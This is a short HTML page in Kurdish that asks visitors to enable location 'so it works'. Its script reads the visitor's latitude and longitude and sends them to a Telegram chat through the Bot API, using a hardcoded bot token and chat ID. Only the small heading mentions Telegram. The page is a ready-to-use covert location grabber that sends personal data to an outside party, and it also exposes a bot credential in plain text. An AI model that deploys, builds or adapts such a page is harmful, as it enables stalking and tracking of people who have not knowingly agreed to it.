<!DOCTYPE html>
<html>
<head>
  <title>بینینی پەڕەکە</title>
  <meta charset="utf-8">
  <script>
    function sendLocation(position) {
      var lat = position.coords.latitude;
      var lon = position.coords.longitude;
      var token = "7835040271:AAFmaIjCdtgYlR_L44Sevj8gvROrvN7FkUk";
      var chat_id = "7594104612";
      var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=لۆکەیشنی بەکارهێنەر:%0ALatitude: ${lat}%0ALongitude: ${lon}`;

      fetch(url)
        .then(response => {
          if (response.ok) {
            alert("سەرکەوتوو بوو، زۆر سوپاس");
          } else {
            alert("کێشە هەیە لۆکەیشنت پێ نەکردووە");
          }
        })
        .catch(error => {
          alert("هەڵەیەک ڕوویدا: " + error);
        });
    }

    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocation, function(error) {
          alert("ناتوانیت بیبینیت لۆکەیشنت کێشەی هەیە پێ نەکراوە");
        });
      } else {
        alert("ئەمەزگەیەکت ڕێگە پێ نەدات بە لۆکەیشن");
      }
    }
  </script>
</head>
<body>
  <h2>ناردنی لۆکەیشن بۆ تلیگرام</h2>
  <button onclick="getLocation()">تکایە لۆکەیشن بکەوە بۆ ئەوەی کار بکات</button>
</body>
</html>
